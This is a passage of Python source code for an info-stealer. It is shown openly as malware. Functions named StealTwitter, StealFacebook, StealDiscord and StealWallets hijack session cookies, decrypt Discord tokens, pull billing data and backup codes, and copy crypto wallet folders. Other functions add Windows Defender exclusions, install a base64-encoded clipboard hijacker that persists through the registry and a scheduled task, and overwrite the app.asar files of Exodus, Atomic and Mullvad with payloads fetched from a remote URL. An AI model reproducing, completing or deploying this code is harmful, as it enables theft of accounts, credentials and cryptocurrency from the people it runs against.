        except Exception as e:
            logs_handler(f"tiktok session error - {str(e)}")
            pass
        else:
            ListFonction.TikTokAccounts.append(f"User ID: {user_id}\nUsername: {username}\nEmail: {email}\nPhone: {phone}\nCoins: {coins}\nCreated At: {formatted_date}\nSubscribers: {subscriber}\nBrowser: {browser}\nCookie: {cookie}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

    async def StealStake(self, cookie: str, browser: str) -> None:
        try:
            data = f"Cookie: {str(cookie)}\nBrowser: {str(browser)}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        except Exception as Error:
            logs_handler(f"Error getting stake session: {str(Error)}")
        else:
            ListFonction.StakeAccount.append(data)

    async def StealTwitter(self, cookie: str, browser: str) -> None:
        try:
            authToken = f'{cookie};ct0=ac1aa9d58c8798f0932410a1a564eb42'
            headers = {
                'authority': 'twitter.com', 'accept': '*/*', 'accept-language': 'en-US,en;q=0.9',
                'authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                'origin': 'https://twitter.com', 'referer': 'https://twitter.com/home', 'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'sec-gpc': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                'x-twitter-active-user': 'yes', 'x-twitter-auth-type': 'OAuth2Session', 'x-twitter-client-language': 'en',
                'x-csrf-token': 'ac1aa9d58c8798f0932410a1a564eb42', "cookie": f'auth_token={authToken}'
            }
            url = "https://twitter.com/i/api/1.1/account/update_profile.json"

            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                response = await session.post(url, headers=headers)
                req = await response.json()

                username = req.get("name", "N/A")
                nickname = req.get("screen_name", "N/A")
                followers_count = req.get("followers_count", 0)
                following_count = req.get("friends_count", 0)
                tweets_count = req.get("statuses_count", 0)
                verified = req.get("verified", False)
                created_at = req.get("created_at", "N/A")
                description = req.get("description", "N/A")
                profileURL = f"https://twitter.com/{nickname}"
            
        except Exception as e:
            logs_handler(f"twitter session error - {str(e)}")
        else:
            ListFonction.TwitterAccounts.append(f"Username: {username}\nScreen Name: {nickname}\nFollowers: {followers_count}\nFollowing: {following_count}\nTweets: {tweets_count}\nIs Verified: {'Yes' if verified else 'No'}\nCreated At: {created_at}\nBiography: {description}\nProfile URL: {profileURL}\nCookie: {cookie}\nBrowser: {browser}\n====================================================================================\n")
 

    async def StealFacebook(self, cookie, browser):
        cookies = await Parse_Cookie(cookie)
        headers = {
            'authority': 'adsmanager.facebook.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
            'sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.140", "Google Chrome";v="112.0.5615.140", "Not:A-Brand";v="99.0.0.0"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-ch-ua-platform-version': '"15.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
            'viewport-width': '794'
        }

        async with aiohttp.ClientSession(headers=headers, cookies=cookies) as session:
            token = await Get_Market(session)
            if not token:
                return None
            uid = cookies.get('c_user')
            return uid

        def Parse_Cookie(cookie):
            cookies = {}
            for cooki in cookie.split(';'):
                key_value = cooki.strip().split('=', 1)
                if len(key_value) == 2:
                    key, value = key_value
                    if key.lower() in ['c_user', 'xs', 'fr']:
                        cookies[key] = value
            return cookies

        async def Get_Market(session):
            try:
                async with session.get('https://adsmanager.facebook.com/adsmanager/manage') as resp:
                    page_content = await resp.text()
                    x = page_content.split("act=")
                    idx = x[1].split('&')[0]
                    
                    async with session.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={idx}&breakdown_regrouping=1&nav_source=no_referrer') as resp_campaign:
                        campaign_content = await resp_campaign.text()
                        x_token = campaign_content.split('{window.__accessToken="')
                        token = x_token[1].split('";')[0]
                        return token
            except Exception:
                return False

        async def Get_info_Tkqc(session, token):
            try:
                get_tkqc = f"https://graph.facebook.com/v17.0/me/adaccounts?fields=account_id&access_token={token}"
                async with session.get(get_tkqc) as resp:
                    list_tikqc = await resp.json()
                    datax = ''
                    for item in list_tikqc['data']:
                        xitem = item["id"]
                        url = f"https://graph.facebook.com/v16.0/{xitem}/?fields=spend_cap,amount_spent,adtrust_dsl,adspaymentcycle,currency,account_status,disable_reason,name,created_time&access_token={token}"
                        async with session.get(url) as resp_account:
                            data = await resp_account.json()
                            statut = data.get("account_status", "Unknown Status")
                            stt = "Live" if int(statut) == 1 else "Dead"
                            name = data["name"]
                            id_tkqc = data["id"]
                            tien_te = data["currency"]
                            du_no = data["spend_cap"]
                            da_chi_tieu = data["amount_spent"]
                            limit_ngay = data["adtrust_dsl"]
                            created_time = data["created_time"]
                            nguong_no = data.get("adspaymentcycle", {}).get("data", [{}])[0].get("threshold_amount", "No Card")
                            if tien_te in ["USD", "EUR", "JPY", "GBP", "AUD", "CAD", "CHF", "CNY", "SEK", "NZD", "MXN", "SGD", "HKD", "NOK", "KRW", "TRY", "RUB", "INR", "BRL", "ZAR", "MYR", "DKK", "PLN", "HUF", "ILS", "THB", "CLP", "COP", "PHP"]:
                                nguong_no = nguong_no // 100 if isinstance(nguong_no, int) else nguong_no
                            datax += f"- Ad Account Name: {name}|ID: {id_tkqc}|Status: {stt}|Currency: {tien_te}|Spend Cap: {du_no}|Total Spend: {da_chi_tieu}|Daily Limit: {limit_ngay}|Debt Threshold: {nguong_no}|Created: {created_time[:10]}\n"
                    return f"Total Ad Accounts: {len(list_tikqc['data'])}\n{datax}"
            except:
                return 'No Ad Accounts Found'

        async def Get_Page(session, token):
            try:
                List_Page = f"https://graph.facebook.com/v17.0/me/facebook_pages?fields=name%2Clink%2Cfan_count%2Cfollowers_count%2Cverification_status&access_token={token}"
                async with session.get(List_Page) as resp:
                    data = await resp.json()
                    if 'data' in data:
                        pages = data["data"]
                        page_data = f"Total Pages: {len(pages)}\n"
                        for page in pages:
                            name = page["name"]
                            link = page["link"]
                            like = page["fan_count"]
                            fl = page["followers_count"]
                            veri = page["verification_status"]
                            page_data += f"- {name}|{link}|Likes: {like}|Followers: {fl}|Verification: {veri}\n"
                        return page_data
                    else:
                        return "Pages: 0"
            except:
                return 'Error retrieving pages'

        async def Get_QTV_Gr(session, token):
            try:
                get_group = f"https://graph.facebook.com/v17.0/me/groups?fields=administrator,member_count&limits=1500&access_token={token}"
                async with session.get(get_group) as resp:
                    data = await resp.json()
                    ids = "QTV Groups:\n"
                    for item in data.get("data", []):
                        if item.get("administrator"):
                            group_id = item["id"]
                            count = item['member_count']
                            ids += f"- https://www.facebook.com/groups/{group_id}|Members: {count}\n"
                    return ids
            except:
                return 'QTV Groups: 0'

        async def Get_id_BM(session, token):
            List_BM = f"https://graph.facebook.com/v17.0/me?fields=businesses&access_token={token}"
            async with session.get(List_BM) as resp:
                data = await resp.json()
                try:
                    listbm = data["businesses"]["data"]
                    id_list = []
                    for item in listbm:
                        business_id = item["id"]
                        business_name = item["name"]
                        id_list.append([business_id, business_name])
                    return id_list
                except:
                    return None

        cookies = Parse_Cookie(cookie)
        token = await Get_Market(browser)
        if not token:
            return "Authentication failed, token not found."
        uid = cookies.get('c_user')
        if not uid:
            return "UID not found in cookies."

        info_tkqc = await Get_info_Tkqc(browser, token)        
        pages = await Get_Page(browser, token)
        groups = await Get_QTV_Gr(browser, token)
        business_managers = await Get_id_BM(browser, token)

        ListFonction.FacebookAccounts.append(f"Browser: {browser}\nToken Info: {info_tkqc}\nPages: {pages}\nGroups: {groups}\nBuissness Managers: {business_managers}\n")


    async def StealDiscord(self) -> None:
        try:
            baddglist = [
                {"N": 'Active_Developer', 'V': 4194304, 'E': 'Active Developer '},
                {"N": 'Early_Verified_Bot_Developer', 'V': 131072, 'E': "Verified Bot Developer "},
                {"N": 'Bug_Hunter_Level_2', 'V': 16384, 'E': "Bug Hunter Lvl 2 "},
                {"N": 'Early_Supporter', 'V': 512, 'E': "Early Supporter "},
                {"N": 'House_Balance', 'V': 256, 'E': "House Balance "},
                {"N": 'House_Brilliance', 'V': 128, 'E': "House Brilliance "},
                {"N": 'House_Bravery', 'V': 64, 'E': "House Bravery "},
                {"N": 'Bug_Hunter_Level_1', 'V': 8, 'E': "Bug Hunter Lvl 1 "},
                {"N": 'HypeSquad_Events', 'V': 4, 'E': "HypeSquad "},
                {"N": 'Partnered_Server_Owner', 'V': 2, 'E': "Partnered Server Owner "},
                {"N": 'Discord_Employee', 'V': 1, 'E': "Discord Employee "}
            ]

            async def UhqGuild(token) -> str:
                try:
                    uhq = []
                    headers = {
                        "Authorization": token,
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }
                    async with aiohttp.ClientSession() as session:
                        async with session.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers) as response:
                            guilds = await response.json()

                    for guild in guilds:
                        if guild["approximate_member_count"] < 30 or not (guild["owner"] or guild["permissions"] == "4398046511103"):
                            continue
                        
                        async with aiohttp.ClientSession() as session:
                            async with session.get(f"https://discord.com/api/v6/guilds/{guild['id']}/invites", headers=headers) as response:
                                invites = await response.json()

                        link = invites[0]['code'] if invites else None

                        uhq.append(f"[{guild['name']}]({f'https://discord.gg/{link}' if link else ''}) ({guild['id']}) {guild['approximate_member_count']} Members")

                    return '\n'.join(uhq) if uhq else "No HQ Guilds"
                except Exception as e:
                    logs_handler(f"uhqguild error - {str(e)}")
                    return "No HQ Guilds"


            async def GetUhqFriend(token, max_friends=5) -> str:
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }
                    url = "https://discord.com/api/v6/users/@me/relationships"
                    
                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                        async with session.get(url, headers=headers) as response:
                            friendlist = await response.json()


                    uhqlist = ''
                    friend_count = 0 

                    for friend in friendlist:
                        OwnedBadges = ''
                        flags = friend['user']['public_flags']
                        for badge in baddglist:
                            if flags // badge["V"] != 0 and friend['type'] == 1:
                                if not "House" in badge["N"] and not badge["N"] == "Active_Developer":
                                    OwnedBadges += badge["E"]
                                flags = flags % badge["V"]
                        if OwnedBadges != '':
                            uhqlist += f"{OwnedBadges} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\n"
                    return uhqlist if uhqlist != '' else "No HQ Friends"
                except Exception as e:
                    logs_handler(f"uhq firends error - {str(e)}")

            def GetBadge(flags):
                if flags == 0:
                    return ''

                owned_badges = ''
                for badge in baddglist:
                    if flags // badge["V"] != 0:
                        owned_badges += badge["E"]
                        flags = flags % badge["V"]
                return owned_badges

            async def GetTokenInfo(token):
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }
                    url = "https://discord.com/api/v6/users/@me"
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, headers=headers) as response:
                            user_info = await response.json()

                    username = user_info["username"]

                    globalusername = 'None'
                    if "global_name" in user_info:
                        globalusername = user_info["global_name"]

                    bio = "None"
                    if "bio" in user_info:
                        bio = user_info["bio"]
                        if len(bio) > 70:
                            bio = bio[:67] + "..."

                    nsfw = ""
                    if "nsfw_allowed" in user_info:
                        nsfw = user_info["nsfw_allowed"]
                        if nsfw == "False":
                            nsfw = "False"
                        else:
                            nsfw = "True"
                            
                    hashtag = user_info["discriminator"]
                    email = user_info.get(f"email", "")
                    user_id = user_info["id"]

                    flags = user_info[f"public_flags"]
                    nitros = "No Nitro"
                    phone = "No Phone"

                    if "premium_type" in user_info:
                        nitros = user_info["premium_type"]
                        if nitros == 1:
                            nitros = "Nitro Classic "
                        elif nitros == 2:
                            nitros = "Nitro Boost "
                        elif nitros == 3:
                            nitros =  "Nitro Basic "

                    if "phone" in user_info:
                        phone = f'`{user_info["phone"]}`'

                    return username, globalusername, bio, nsfw, hashtag, email, user_id, flags, nitros, phone
                except Exception as e:
                    logs_handler(f"token info error - {str(e)}")


            async def CheckToken(token) -> bool:
                headers = {
                    "Authorization": token,
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                }

                url = "https://discord.com/api/v6/users/@me"
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get(url, headers=headers) as response:
                            if response.status == 401:
                                return False
                            else:
                                return True
                except Exception as e:
                    logs_handler(f"check token error - {str(e)}")
                    return False

            async def GetBilling(token):
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }

                    url = "https://discord.com/api/users/@me/billing/payment-sources"
                    try:
                        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
                            async with session.get(url, headers=headers) as response:
                                response_text = await response.text()
                                billing_json = json.loads(response_text)

                    except Exception as e:
                        logs_handler(f"get billing url error - {str(e)}")
                        return False
                    
                    if not billing_json:
                        return "False"
                    
                    billing = ""
                    for method in billing_json:
                        if not method["invalid"]:
                            if method["type"] == 1:
                                billing += "Credit Card "
                            elif method["type"] == 2:
                                billing += "PayPal "
                            elif method["type"] == 17:
                                billing += "CashApp "
                    return billing
                except Exception as e:
                    logs_handler(f"get billing error - {str(e)}")

            async def GetBack() -> None:
                try:
                    path = os.environ["HOMEPATH"]
                    code_path = '\\Downloads\\discord_backup_codes.txt'
                    if os.path.exists(path + code_path):
                        with open(path + code_path, 'r', encoding='utf-8') as file:
                            backup = file.readlines()
                            
                        return backup
                            
                except Exception as e:
                    logs_handler(f"get backup discord code - {str(e)}")
                    return 'No backup code saved'
                
            async def GetDiscordConnection(token) -> None:
                try:
                    headers = {
                        "Authorization": token,
                        "Content-Type": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
                    }

                    async with aiohttp.ClientSession() as session:
                        async with session.get("https://discord.com/api/v6/users/@me/connections", headers=headers) as response:
                            if response.status == 200:
                                data = await response.json()

                                Services = {
                                    "battlenet": "https://battle.net",
                                    "ebay": "https://ebay.com",
                                    "epicgames": "https://epicgames.com",
                                    "facebook": "https://facebook.com",
                                    "github": "https://github.com",
                                    "instagram": "https://instagram.com",
                                    "leagueoflegends": "https://leagueoflegends.com",
                                    "paypal": "https://paypal.com",
                                    "playstation": "https://playstation.com",
                                    "reddit": "https://reddit.com",
                                    "riotgames": "https://riotgames.com",
                                    "spotify": "https://spotify.com",
                                    "skype": "https://skype.com",
                                    "steam": "https://store.steampowered.com",
                                    "tiktok": "https://tiktok.com",
                                    "twitch": "https://twitch.tv",
                                    "twitter": "https://twitter.com",
                                    "xbox": "https://xbox.com",
                                    "youtube": "https://youtube.com"
                                }

                                connections_list = []
                                for connection in data:
                                    connections_list.append(f"Username: {connection['name']}\nServices : [{connection['type']}]({Services.get(connection['type'], 'Unknown')})\n")
                                return connections_list
                            else:
                                return []
                except Exception as e:
                    logs_handler(f"discord connections error - {str(e)}")
        
            async def GetGift(token) -> None:
                try:
                    async with aiohttp.ClientSession() as session:
                        async with session.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}) as response:
                            if response.status == 200:
                                gift_codes = await response.json()
                                if gift_codes:
                                    codes = []
                                    for code in gift_codes:
                                        name = code['promotion']['outbound_title']
                                        code_value = code['code']
                                        data = f"Name: {name}\nCode: {code_value}"
                                        codes.append(data)
                                    return '\n\n'.join(codes) if codes else 'No Gift'
                                else:
                                    return 'No Gift'
                            else:
                                return 'No Gift'
                except Exception as e:
                    logs_handler(f"get gifts error - {str(e)}")
            processed_tokens = []
            processed_id = []
            async def UploadToken(token, path) -> None:
                try:
                    if token in processed_tokens:
                        return
                    
                    processed_tokens.append(token)
                    username, globalusername, bio, nsfw, hashtag, email, user_id, flags, nitro, phone = await GetTokenInfo(token)
                
                    if user_id in processed_id:
                        return
                 
                    processed_id.append(user_id)                    
                 
                    back = await GetBack()
                    billing = await GetBilling(token)
                    badge = GetBadge(flags)
                    friends = await GetUhqFriend(token)
                    guild = await UhqGuild(token)
                    gift = await GetGift(token)
                    connections = await GetDiscordConnection(token)

                    if isinstance(connections, list):
                        connections_str = "\n".join(connections) if connections else 'No Connections'
                    else:
                        connections_str = 'No Connections'
                    if friends == '':
                        friends = "No Rare Friends"
                    if not billing:
                        billing = "No Billing"
                    if not badge:
                        badge = "No Badge"
                    if not phone: 
                        phone = "No Phone"
                    if hashtag == '0':
                        hashtag = ''
                    
                except Exception as e:
                    logs_handler(f"upload token error - {str(e)}")
                else:
                    ListFonction.discord.append(f"Token: {token}\nPath: {path}\nUser: {username}#{hashtag} ({user_id}) Global Username : {globalusername}\nPhone: {phone}\nEmail: {email}\nNsfw Enable?: {nsfw}\nBadge: {nitro}{badge}\nBilling: {billing}\nBiography: {bio}\nHQ Friends: {friends}\nGuilds: {guild}\nConnection: {connections_str}\nGift: {gift}\nBackup Code: {back}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")

                            
            tokens = []

            async def GetDiscord(path, arg):
                try:
                    if not os.path.exists(f"{path}/Local State"):
                        return

                    pathC = path + arg
                    pathKey = path + "/Local State"

                    key = WindowsApi.GetKey(pathKey)

                    for file in os.listdir(pathC):
                        if file.endswith(".log") or file.endswith(".ldb"):
                            with open(f"{pathC}\\{file}", 'r', errors="ignore") as f:
                                for line in [x.strip() for x in f.readlines() if x.strip()]:
                                    for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                                        TokenDecoded = WindowsApi.Decrpytion(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), key)
                                        if await CheckToken(TokenDecoded):
                                            if TokenDecoded not in tokens:
                                                tokens.append(TokenDecoded)
                                                await UploadToken(TokenDecoded, path)

                except Exception as e:
                    logs_handler(f"get discord error - {str(e)}")


            discordPaths = [        
                [f"{self.appdata}", "Discord", "Local Storage", "leveldb"],
                [f"{self.appdata}", "Lightcord", "Local Storage", "leveldb"],
                [f"{self.appdata}", "discordcanary", "Local Storage", "leveldb"],
                [f"{self.appdata}", "discordbtp", "Local Storage", "leveldb"],
            ]                    

            try:
                for path in discordPaths:
                    await GetDiscord(path[0], path[1])
            except Exception as e:
                logs_handler(f"run browser & token error - {str(e)}")

        except Exception as e:
            logs_handler(f"discord error - {str(e)}")


    async def StealWallets(self, copied_path: str) -> None:
        try:
            wallets_ext_names = {
                "Binance": "fhbohimaelbohpjbbldcngcnapndodjp",
                "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
                "Authy": "gaedmjdfmmahhbjefcbgaolhhanlaolb",
                "EOSAuthenticator": "oeljdldpnmdbchonielidgobddffflal",
                "GAuthAuthenticator": "ilgcnhelpchnceeipipijaljkblbcobl",
                "TON": "nphplpgoakhhjchkkhmiggakijnkhfnd",
                "Ronin (Chrome)": "fnjhmkhhmkbjkkabndcnnogagogbneec",
                "Coinbase": "hnfanknocfeofbddgcijnmhnfnkdnaad",
                "MetaMask (Chrome)": "nkbihfbeogaeaoehlefnkodbefgpgknn",
                "MetaMask (Edge)": "ejbalbakoplchlghecdalmeeeajnimhm",
                "Exodus": "aholpfdialjgjfhomihkjbmgjidlcdno",
                "TrustWallet": "egjidjbpglichdcondbcbdnbeeppgdph",
                "Metamask (Opera)": "djclckkglechooblngghdinmeemkbgci",
                "Ronin (Edge)": "bblmcdckkhkhfhhpfcchlpalebmonecp",
                }
            
            wallet_local_paths = {
                "Bitcoin": os.path.join(self.appdata, "Bitcoin", "wallets"),
                "Bytecoin": os.path.join(self.appdata, "bytecoin"),
                "Coinomi": os.path.join(self.localappdata, "Coinomi", "Coinomi", "wallets"),
                "Atomic": os.path.join(self.appdata, "Atomic", "Local Storage", "leveldb"),
                "Dash": os.path.join(self.appdata, "DashCore", "wallets"),
                "Exodus": os.path.join(self.appdata, "Exodus", "exodus.wallet"),
                "Electrum": os.path.join(self.appdata, "Electrum", "wallets"),
                "WalletWasabi": os.path.join(self.appdata, "WalletWasabi", "Client", "Wallets"),
            }
            wallet_dir = os.path.join(copied_path, "Wallets")
            os.makedirs(wallet_dir, exist_ok=True)

            for path in self.profiles_full_path:
                ext_path = os.path.join(path, "Local Extension Settings")
                if os.path.exists(ext_path):
                    for wallet_name, wallet_addr in wallets_ext_names.items():
                        wallet_path = os.path.join(ext_path, wallet_addr)
                        if os.path.isdir(wallet_path):
                            try:
                                file_name = f"{os.path.basename(ext_path)} {wallet_name}"
                                dest_path = os.path.join(wallet_dir, file_name)
                                shutil.copytree(wallet_path, dest_path)
                            except Exception as Error:
                                logs_handler(f"[ERROR] - copying extensions Wallets {str(Error)}")


            for wallet_name, wallet_path in wallet_local_paths.items():
                try:
                    if os.path.exists(wallet_path):
                        dest_path = os.path.join(wallet_dir, wallet_name)
                        shutil.copytree(wallet_path, dest_path)
                except Exception as Error:
                    logs_handler(f"[ERROR] - copying desktop Wallets {str(Error)}")

        except Exception as Error:
            logs_handler(f"Error Stealing Wallets | {str(Error)}")

    async def DefenderExclusion(self) -> None:
        app_data_hidden_folder = os.path.join(self.localappdata, f".{''.join(random.choices(string.ascii_letters + string.digits, k=10))}")
        system_tasks_path = "C:\\Windows\\System32\\Tasks"

        commands = [
            f"powershell -Command Add-MpPreference -ExclusionPath \"{app_data_hidden_folder}\"",
            f"powershell -Command Add-MpPreference -ExclusionPath \"{system_tasks_path}\""
        ]

        for command in commands:
            try:
                output = subprocess.check_output(command, shell=True)
            except subprocess.CalledProcessError:
                pass

    async def CryptoClipper(self) -> None:
        generate_random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        python_installer_url = "https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe"
        python_installer_file = os.path.join(self.temp, "python-installer.exe")

        try:
            output = subprocess.check_output(["python", "--version"], stderr=subprocess.STDOUT).decode()
            if "Python 3.12.6" in output:
                python_installed = True
            else:
                python_installed = False
        except FileNotFoundError:
            python_installed = False

        if not python_installed:
            try:
                with requests.get(python_installer_url, stream=True) as response:
                    with open(python_installer_file, 'wb', encoding="utf-8", errors="ignore") as file:
                        shutil.copyfileobj(response.raw, file)
            except Exception as e:
                pass

            try:
                subprocess.run([python_installer_file, "/quiet", "InstallAllUsers=0", "PrependPath=1", "Include_test=0", "Include_pip=1", "Include_doc=0"], check=True)
            except subprocess.CalledProcessError as e:
                pass
            os.remove(python_installer_file)

        pythonw_exe = os.path.join(os.getenv("USERPROFILE"), "AppData", "Local", "Programs", "Python", "Python312", "pythonw.exe")

        app_data_hidden_folder = os.path.join(os.getenv("USERPROFILE"), "AppData", "Local", f".{generate_random_string}")
        os.makedirs(app_data_hidden_folder, exist_ok=True)



        python_code = f"""
import asyncio
import re

async def CryptoClipper() -> None:
        try:
            async def StealClipboard():
                try:
                    process = await asyncio.create_subprocess_shell('powershell -Command Get-Clipboard', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                    stdout, _ = await process.communicate()
                    return stdout.decode().strip()
                except Exception:
                    return ""

            async def SetClipboard(text):
                try:
                    await asyncio.create_subprocess_shell(f'powershell -Command "Set-Clipboard -Value \'{{text}}\'"', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                except Exception:
                    return

            # the clipper is not working (i'm working on it)
            blockchains = [
                ("BTC_ADDRESS", re.compile(r"^(bc1|[13])[a-zA-HJ-NP-Z0-9]{{25,39}}$")),  # BTC
                ("LTC_ADDRESS", re.compile(r"^(L|M|3)[a-km-zA-HJ-NP-Z1-9]{{26,33}}$")),  # LTC
                ("STELLAR_ADDRESS", re.compile(r"^G[0-9a-zA-Z]{{55}}$")),  # Stellar
                ("RIPPLE_ADDRESS", re.compile(r"^r[0-9a-zA-Z]{{24,34}}$")),  # Ripple
                ("BCH_ADDRESS", re.compile(r"^(bitcoincash:)?(q|p)[a-z0-9]{{41}}$")),  # BCH
                ("ETH_ADDRESS", re.compile(r"^0x[a-fA-F0-9]{{40}}$")),  # ETH
                ("NEO_ADDRESS", re.compile(r"^A[0-9a-zA-Z]{{33}}$")),  # NEO
                ("DASH_ADDRESS", re.compile(r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{{32}}$"))  # Dash
            ]

            while True:
                try:
                    clipboard_content = await StealClipboard()
                    modified_text = clipboard_content
                    detected = False

                    for address_name, pattern in blockchains:
                        target_address = address_name

                        for line in clipboard_content.splitlines():
                            if line == target_address:
                                break
                            if pattern.match(line):
                                detected = True
                                modified_text = modified_text.replace(line, target_address)

                    if detected:
                        await SetClipboard(modified_text)

                    await asyncio.sleep(1)

                except Exception as Error:
                    pass
        except Exception as Error:
            pass
            
asyncio.run(CryptoClipper())
"""
        encoded_code = base64.b64encode(python_code.encode('utf-8')).decode('utf-8')
        
        script_content = f"""
import base64
import asyncio

async def main():
    code = base64.b64decode("{encoded_code}").decode('utf-8')
    exec(code)

asyncio.run(main())
"""

        script_file_path = os.path.join(app_data_hidden_folder, f"{generate_random_string}.py")
        with open(script_file_path, 'w', encoding="utf-8", errors="ignore") as file:
            file.write(script_content)

        try:
            registry_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PythonScript" /t REG_SZ /d "{pythonw_exe} \\"{script_file_path}\\"" /f'
            subprocess.run(registry_command, shell=True)

            task_name = f"PythonUpdater_{''.join(random.choices(string.ascii_letters + string.digits, k=8))}"
            subprocess.run(f'schtasks /create /tn "{task_name}" /tr "{pythonw_exe} {script_file_path}" /sc onlogon /f', shell=True)
        except subprocess.CalledProcessError as e:
            pass

        try:
            subprocess.Popen([pythonw_exe, script_file_path], close_fds=True)
        except Exception as e:
            pass

    async def InjectWallets(self) -> None:
        async def inject(app_path, asar_path, injection_url, license_path=None):
            if not Path(app_path).exists() or not Path(asar_path).exists():
                return

            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(injection_url) as response:
                        if response.status != 200:
                            return

                        with open(asar_path, 'wb') as writer:
                            async for chunk in response.content.iter_chunked(1024):
                                writer.write(chunk)

                        if license_path:
                            with open(license_path, 'w') as license_file:
                                license_file.write(f"{TOKEN}\n{CHAT_ID}")

            except Exception as Error:
                logs_handler(f"Error Injecting Wallet | {str(Error)}")

        atomic_path = os.path.join(self.localappdata, 'Programs', 'atomic')
        atomic_asar_path = os.path.join(atomic_path, 'resources', 'app.asar')
        atomic_license_path = os.path.join(atomic_path, 'LICENSE.electron.txt')
        await inject(atomic_path, atomic_asar_path, atomic_injection_url, atomic_license_path)

        exodus_path = os.path.join(self.localappdata, 'exodus')
        if Path(exodus_path).exists():
            exodus_dirs = [d for d in os.listdir(exodus_path) if d.startswith('app-')]
            for exodus_dir in exodus_dirs:
                exodus_versioned_path = os.path.join(exodus_path, exodus_dir)
                exodus_asar_path = os.path.join(exodus_versioned_path, 'resources', 'app.asar')
                exodus_license_path = os.path.join(exodus_versioned_path, 'LICENSE')
                await inject(exodus_versioned_path, exodus_asar_path, exodus_injection_url, exodus_license_path)


    async def InjectMullvad(self) -> None:
        async def inject(app_path: str, asar_path: str, mullvad_injection_url: str, license_path: str = None) -> None:
            if not Path(app_path).exists() or not Path(asar_path).exists():
                return
            
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(mullvad_injection_url) as response:
                        if response.status != 200:
                            return
                        
                        with open(asar_path, 'wb') as writer:
                            async for chunk in response.content.iter_chunked(1024):
                                writer.write(chunk)

                    if license_path:
                        with open(license_path, 'w') as license_file:
                            license_file.write(f"{TOKEN}\n{CHAT_ID}")

            except Exception as Error:
                logs_handler(f"Error injecting into mullvad {str(Error)}")
        try:
            all_disks = []
            for drive in range(ord('A'), ord('Z') + 1):
                drive_letter = chr(drive)
                if os.path.exists(drive_letter + ':\\'):
                    all_disks.append(drive_letter)

            for mullvad_path in all_disks:
                mullvad_path = os.path.join(mullvad_path, "Program Files", "Mullvad VPN")
        except Exception as Error:
            logs_handler(f"Error getting disk lettre for mullvad")
        mullvad_asar_path = os.path.join(mullvad_path, 'resources', 'app.asar')
        mullvad_license_path = os.path.join(mullvad_path, 'LICENSE.electron.txt')
        
        if Path(mullvad_license_path).exists():
